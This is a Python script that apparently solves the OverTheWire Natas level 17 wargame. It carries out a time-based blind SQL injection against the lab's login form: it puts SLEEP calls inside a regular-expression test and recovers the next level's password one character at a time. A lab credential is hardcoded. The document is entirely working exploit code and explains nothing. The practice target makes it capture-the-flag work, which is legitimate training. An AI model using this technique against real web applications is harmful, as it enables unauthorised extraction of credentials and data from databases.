import time
import requests
import string

target = "http://natas17.natas.labs.overthewire.org/"
# Replace with natas17 password
auth = ("natas17", "EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC")
password = ""


def injection(prefix: str, nextChar: str, threshold: int):
    return {'username': f'natas18" AND IF(REGEXP_LIKE(password, "^{prefix}{nextChar}[[:alnum:]]*", "c"), SLEEP({threshold}), SLEEP(0)) AND "" LIKE "'}


def predicate(prefix: str, nextChar: str, threshold: int = 3):
    start_time = time.time()
    requests.post(target, injection(prefix, nextChar, threshold), auth=auth)
    end_time = time.time()
    return (end_time - start_time) >= threshold
    # return (end_time - start_time) >= threshold if (end_time - start_time) >= 0.5 else predicate(prefix, nextChar, threshold)


while (predicate(password, '[[:alnum:]]', 5)):
    print(f"Progress: {password+"*"} -> ", end="")
    chosen_chaset = string.ascii_letters
    if predicate(password, '[[:alpha:]]'):
        chosen_chaset = string.ascii_uppercase if predicate(
            password, '[[:upper:]]') else string.ascii_lowercase
    else:
        chosen_chaset = string.digits
    best = None
    for char in chosen_chaset:
        if predicate(password, char):
            best = char
            break
    if best is None:
        print("Error, retrying")
        continue
    password += char
    print(password)
print(f"Final password: {password}")
